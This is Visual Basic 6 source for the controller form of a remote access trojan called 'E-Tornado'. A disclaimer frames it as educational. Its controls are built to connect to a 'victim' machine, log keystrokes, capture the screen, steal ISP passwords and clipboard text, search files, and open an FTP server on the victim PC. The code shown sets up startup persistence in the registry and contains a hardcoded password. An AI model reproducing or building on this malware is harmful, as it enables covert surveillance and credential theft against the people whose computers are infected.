VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   Appearance      =   0  'Flat
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "E-Tornado"
   ClientHeight    =   6720
   ClientLeft      =   93345
   ClientTop       =   3.08130e5
   ClientWidth     =   9075
   Icon            =   "client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6720
   ScaleWidth      =   9075
   StartUpPosition =   1  'CenterOwner
   Begin VB.Frame Frame7 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Extra"
      ForeColor       =   &H80000008&
      Height          =   735
      Left            =   0
      TabIndex        =   28
      Top             =   3960
      Width           =   9015
      Begin Project1.lvButtons_H lvButtons_H18 
         Height          =   375
         Left            =   3360
         TabIndex        =   34
         ToolTipText     =   "Resend ip and control the server"
         Top             =   240
         Width           =   2175
         _ExtentX        =   3836
         _ExtentY        =   661
         Caption         =   "Server Control"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H16 
         Height          =   375
         Left            =   7320
         TabIndex        =   35
         ToolTipText     =   "Locate ip address on world map"
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   "Ip Trace"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H15 
         Height          =   375
         Left            =   120
         TabIndex        =   36
         ToolTipText     =   "Start ws_ftp program (port 885)"
         Top             =   240
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "Ftp Client"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H14 
         Height          =   375
         Left            =   1320
         TabIndex        =   37
         ToolTipText     =   "Decode english keys to arabic"
         Top             =   240
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Arabic Decoder"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H13 
         Height          =   375
         Left            =   5280
         TabIndex        =   38
         ToolTipText     =   "See all the signals"
         Top             =   240
         Width           =   2295
         _ExtentX        =   4048
         _ExtentY        =   661
         Caption         =   "Signals Monitor"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
   End
   Begin MSComctlLib.StatusBar StatusBar1 
      Align           =   2  'Align Bottom
      Height          =   255
      Left            =   0
      TabIndex        =   26
      Top             =   6465
      Width           =   9075
      _ExtentX        =   16007
      _ExtentY        =   450
      _Version        =   393216
      BeginProperty Panels {8E3867A5-8586-11D1-B16A-00C0F0283628} 
         NumPanels       =   1
         BeginProperty Panel1 {8E3867AB-8586-11D1-B16A-00C0F0283628} 
            Object.Width           =   16085
            MinWidth        =   16085
         EndProperty
      EndProperty
   End
   Begin VB.Frame Frame6 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Save options"
      ForeColor       =   &H80000008&
      Height          =   855
      Left            =   0
      TabIndex        =   22
      Top             =   5520
      Width           =   9015
      Begin Project1.lvButtons_H lvButtons_H20 
         Height          =   375
         Left            =   5880
         TabIndex        =   27
         ToolTipText     =   "Choose where the captured data will be stored in"
         Top             =   360
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "&Browse"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Mode            =   0
         Value           =   0   'False
         cBack           =   14737632
      End
      Begin Project1.lvButtons_H lvButtons_H19 
         Height          =   375
         Left            =   7440
         TabIndex        =   24
         ToolTipText     =   "View the folder"
         Top             =   360
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "View folder"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.TextBox Text3 
         Appearance      =   0  'Flat
         Height          =   350
         Left            =   120
         TabIndex        =   23
         Text            =   "c:\"
         ToolTipText     =   "Browse where to save the captured data"
         Top             =   360
         Width           =   5655
      End
   End
   Begin VB.Frame Frame1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Settings"
      ForeColor       =   &H80000008&
      Height          =   615
      Left            =   0
      TabIndex        =   19
      Top             =   4800
      Width           =   9015
      Begin VB.CheckBox Check5 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Stay connected"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   7080
         TabIndex        =   45
         ToolTipText     =   "Keep your connection alive"
         Top             =   240
         Width           =   1695
      End
      Begin VB.CheckBox Check4 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Always on top "
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   5520
         TabIndex        =   44
         Top             =   240
         Width           =   1455
      End
      Begin VB.CheckBox Check3 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Auto folder creation"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   120
         TabIndex        =   25
         ToolTipText     =   "Auto create folder for the connected victims  "
         Top             =   240
         Width           =   1815
      End
      Begin VB.CheckBox Check2 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Minimize to tray"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   3840
         TabIndex        =   21
         ToolTipText     =   "Show icon on system tray when minimized"
         Top             =   240
         Width           =   1575
      End
      Begin VB.CheckBox Check1 
         Appearance      =   0  'Flat
         BackColor       =   &H00E0E0E0&
         Caption         =   "Start with windows"
         ForeColor       =   &H80000008&
         Height          =   255
         Left            =   2040
         TabIndex        =   20
         ToolTipText     =   "Start Oman Fox with windows"
         Top             =   240
         Width           =   1815
      End
   End
   Begin VB.Frame Frame5 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Victim Control"
      ForeColor       =   &H80000008&
      Height          =   1215
      Left            =   0
      TabIndex        =   15
      Top             =   2640
      Width           =   9015
      Begin Project1.lvButtons_H lvButtons_H12 
         Height          =   375
         Left            =   1440
         TabIndex        =   18
         ToolTipText     =   "Switch on ftp server on victim pc on port 885"
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   "Ftp Server"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H11 
         Height          =   375
         Left            =   4200
         TabIndex        =   17
         ToolTipText     =   "Get victim keys"
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Keys"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H10 
         Height          =   375
         Left            =   120
         TabIndex        =   16
         ToolTipText     =   "Capture victim screen"
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   "Capture Screen"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H26 
         Height          =   375
         Left            =   2640
         TabIndex        =   29
         ToolTipText     =   "Retrive internet host name"
         Top             =   720
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   661
         Caption         =   "Internet host "
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H25 
         Height          =   375
         Left            =   1560
         TabIndex        =   30
         ToolTipText     =   "Retrive pc name"
         Top             =   720
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         Caption         =   "Pc name"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H24 
         Height          =   375
         Left            =   120
         TabIndex        =   31
         ToolTipText     =   "Retrive operating system  information"
         Top             =   720
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         Caption         =   "Operating System"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H23 
         Height          =   375
         Left            =   6360
         TabIndex        =   32
         ToolTipText     =   "Retrive copied text"
         Top             =   240
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   661
         Caption         =   " Clipboard"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H21 
         Height          =   375
         Left            =   5160
         TabIndex        =   33
         ToolTipText     =   "Retrive isp passwords"
         Top             =   240
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "Accounts"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H30 
         Height          =   375
         Left            =   2760
         TabIndex        =   39
         ToolTipText     =   "Retrive victim files information"
         Top             =   240
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         Caption         =   "Files search"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H29 
         Height          =   375
         Left            =   5880
         TabIndex        =   40
         ToolTipText     =   "Retrive the victim signal again"
         Top             =   720
         Width           =   1815
         _ExtentX        =   3201
         _ExtentY        =   661
         Caption         =   "Victim signal"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H28 
         Height          =   375
         Left            =   4200
         TabIndex        =   41
         ToolTipText     =   "Retrive victim given code"
         Top             =   720
         Width           =   1935
         _ExtentX        =   3413
         _ExtentY        =   661
         Caption         =   "Victim version"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H22 
         Height          =   375
         Left            =   7440
         TabIndex        =   42
         ToolTipText     =   "Get hard disk serial number"
         Top             =   720
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "Hdisk Serial "
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H27 
         Height          =   375
         Left            =   7680
         TabIndex        =   43
         ToolTipText     =   "Retrive internet ip address"
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Ip address"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
   End
   Begin VB.Frame Frame4 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Victim Response"
      ForeColor       =   &H80000008&
      Height          =   1695
      Left            =   0
      TabIndex        =   9
      Top             =   840
      Width           =   9015
      Begin Project1.lvButtons_H lvButtons_H8 
         Height          =   375
         Left            =   7680
         TabIndex        =   14
         ToolTipText     =   "Clear the text"
         Top             =   1200
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Clear Text"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H7 
         Height          =   375
         Left            =   7680
         TabIndex        =   13
         ToolTipText     =   "Copy text to clipboard"
         Top             =   720
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Copy Text"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H6 
         Height          =   375
         Left            =   7680
         TabIndex        =   12
         ToolTipText     =   "Save Text to a seprate file"
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Save Text"
         CapAlign        =   2
         BackStyle       =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.TextBox Text2 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H00FF0000&
         Height          =   1395
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   10
         Top             =   240
         Width           =   7215
      End
      Begin MSComctlLib.ProgressBar ProgressBar1 
         Height          =   1335
         Left            =   7440
         TabIndex        =   11
         Top             =   240
         Visible         =   0   'False
         Width           =   135
         _ExtentX        =   238
         _ExtentY        =   2355
         _Version        =   393216
         Appearance      =   0
         Orientation     =   1
      End
   End
   Begin VB.Frame Frame3 
      Caption         =   "controls"
      Height          =   1935
      Left            =   6240
      TabIndex        =   7
      Top             =   6600
      Visible         =   0   'False
      Width           =   2655
      Begin Project1.ctxSysTray ctxSysTray1 
         Left            =   1440
         Top             =   1440
         _ExtentX        =   450
         _ExtentY        =   450
         TrayIcon        =   "client.frx":08CA
      End
      Begin VB.Timer Timer2 
         Interval        =   1000
         Left            =   2400
         Top             =   960
      End
      Begin MSWinsockLib.Winsock Winsock4 
         Left            =   1680
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
         Protocol        =   1
      End
      Begin VB.Timer soundtimer 
         Enabled         =   0   'False
         Interval        =   2000
         Left            =   1800
         Top             =   960
      End
      Begin VB.Timer stayconnectedtimer 
         Enabled         =   0   'False
         Interval        =   3000
         Left            =   600
         Top             =   960
      End
      Begin VB.TextBox Text4 
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H00FF0000&
         Height          =   285
         IMEMode         =   3  'DISABLE
         Left            =   240
         PasswordChar    =   "*"
         TabIndex        =   8
         Text            =   "cobra2000"
         Top             =   960
         Visible         =   0   'False
         Width           =   150
      End
      Begin VB.Timer Timer3 
         Enabled         =   0   'False
         Interval        =   50
         Left            =   1200
         Top             =   960
      End
      Begin MSComDlg.CommonDialog CDialog1 
         Left            =   120
         Top             =   1320
         _ExtentX        =   847
         _ExtentY        =   847
         _Version        =   393216
         Filter          =   "*.txt"
      End
      Begin MSWinsockLib.Winsock Winsock3 
         Left            =   1080
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock2 
         Left            =   120
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
      Begin MSWinsockLib.Winsock Winsock1 
         Left            =   600
         Top             =   240
         _ExtentX        =   741
         _ExtentY        =   741
         _Version        =   393216
      End
   End
   Begin VB.Frame Frame2 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      Caption         =   "Ip Panel"
      ForeColor       =   &H80000008&
      Height          =   735
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   9015
      Begin Project1.lvButtons_H lvButtons_H5 
         Height          =   375
         Left            =   7080
         TabIndex        =   6
         ToolTipText     =   "Save ip info to a seprate file"
         Top             =   240
         Width           =   1815
         _ExtentX        =   3413
         _ExtentY        =   661
         Caption         =   "Save ip details"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   1
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H4 
         Height          =   375
         Left            =   5640
         TabIndex        =   5
         ToolTipText     =   "Get local ip address"
         Top             =   240
         Width           =   1695
         _ExtentX        =   2990
         _ExtentY        =   661
         Caption         =   "Get local ip"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin VB.ComboBox text1 
         BackColor       =   &H00FFFFFF&
         ForeColor       =   &H000000FF&
         Height          =   315
         Left            =   120
         TabIndex        =   1
         ToolTipText     =   "ip address to connect"
         Top             =   240
         Width           =   2175
      End
      Begin Project1.lvButtons_H lvButtons_H1 
         Height          =   375
         Left            =   2400
         TabIndex        =   2
         ToolTipText     =   "Connect to victim"
         Top             =   240
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   661
         Caption         =   "Connect"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   2
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H2 
         Height          =   375
         Left            =   3360
         TabIndex        =   3
         ToolTipText     =   "Copy victim ip"
         Top             =   240
         Width           =   1335
         _ExtentX        =   2355
         _ExtentY        =   661
         Caption         =   "Copy ip"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
      Begin Project1.lvButtons_H lvButtons_H3 
         Height          =   375
         Left            =   4440
         TabIndex        =   4
         ToolTipText     =   "Paste ip address"
         Top             =   240
         Width           =   1455
         _ExtentX        =   2566
         _ExtentY        =   661
         Caption         =   "Paste ip"
         CapAlign        =   2
         BackStyle       =   2
         Shape           =   3
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Times New Roman"
            Size            =   9
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         cGradient       =   0
         Mode            =   0
         Value           =   0   'False
         cBack           =   -2147483633
      End
   End
   Begin VB.Menu systraym 
      Caption         =   "systray"
      Visible         =   0   'False
      Begin VB.Menu showmainw 
         Caption         =   "show main window"
      End
      Begin VB.Menu showmonw 
         Caption         =   "show monitoring window"
      End
      Begin VB.Menu exitprog 
         Caption         =   "Exit"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before making use of this code!
'Disclaimer: This is illegal if executed on real victims and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education purpose only.
'For more educational source codes please visit us http://www.digi77.com
'Author of this code W. Al Maawali Founder of  Eagle Eye Digital Solutions and Oman0.net can be reached via warith@digi77.com .

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!


Option Explicit

'for reg access
Public Reg As RegistryRoutines

'for listview sorting
Dim LVXS As New uSc_ListView_Xtended_Sort

'for spliting string
Public striN

'forlist view
Dim lItem As ListItem

'for version
Dim theversion As String

'start with windows
Private Sub Check1_Click()
    If (Check1.Value = 1) Then
    
        Dim MainKeyRoot As String
        Dim MainSubKey As String
        
        On Error Resume Next
        Form1.Reg.hkey = HKEY_CURRENT_USER
        
        MainKeyRoot = "Software\Microsoft\Windows\CurrentVersion\Run"
        
        Form1.Reg.KeyRoot = MainKeyRoot
        
        Form1.Reg.SetRegistryValue "E-Tornado", App.path & "\" & App.EXEName & ".exe", REG_SZ
    Else
    
        Form1.Reg.hkey = HKEY_CURRENT_USER
        MainKeyRoot = "Software\Microsoft\Windows\CurrentVersion\Run"
        Form1.Reg.KeyRoot = MainKeyRoot
        Form1.Reg.DeleteValue "E-Tornado"
        
    End If
End Sub




'always on top
Private Sub Check4_Click()
 
   If (Check4.Value = 1) Then
    
        Call MakeTopMost(Me.hwnd)
   Else
    
          Call MakeNormal(Me.hwnd)
        
   End If

End Sub

' keep connection
Private Sub Check5_Click()
   If (Check5.Value = 1) Then
    
        stayconnectedtimer.Enabled = True
   Else
    
        stayconnectedtimer.Enabled = False
        
   End If
End Sub

Private Sub ctxSysTray1_DblClick(Button As Integer)
Me.Show
Me.WindowState = 1
End Sub

Private Sub ctxSysTray1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
PopupMenu systraym
End Sub



Private Sub exitprog_Click()
    Unload Me
End Sub



Private Sub Form_Load()

    'registry accesss
    Set Reg = New RegistryRoutines

    
  
    'get saved info get info from registry
    Dim tempregvalue As String
    tempregvalue = GetSetting(Me.name, "Settings", "maincheck1")
    
    If (tempregvalue = "1") Then
        Check1.Value = 1
    Else
        Check1.Value = 0
    End If


    tempregvalue = GetSetting(Me.name, "Settings", "maincheck2")

    If (tempregvalue = "1") Then
        Check2.Value = 1
    Else
        Check2.Value = 0
    End If
    
    
    
    
    
    tempregvalue = GetSetting(Me.name, "Settings", "maincheck3")

    If (tempregvalue = "1") Then
        Check3.Value = 1
    Else
        Check3.Value = 0
    End If
    
    
    
    
    
    tempregvalue = GetSetting(Me.name, "Settings", "maincheck4")

    If (tempregvalue = "1") Then
        Check4.Value = 1
        Call MakeTopMost(Me.hwnd)
    Else
        Check4.Value = 0
    End If
    
    
    
    
    tempregvalue = GetSetting(Me.name, "Settings", "maincheck5")

    If (tempregvalue = "1") Then
        Check5.Value = 1
        stayconnectedtimer.Enabled = True
    Else
        Check5.Value = 0
    End If
    
    
   Text3 = GetSetting(Me.name, "Settings", "maintext3")
   
   If Text3.Text = "" Then
    Text3.Text = "c:\"
   End If
    
    

     Dim founditem As Boolean
     Dim i As Long
     Dim xxx As String
     
    'get ip lists
    On Error Resume Next
    Open App.path & "\data\ip.ssc" For Input As #1
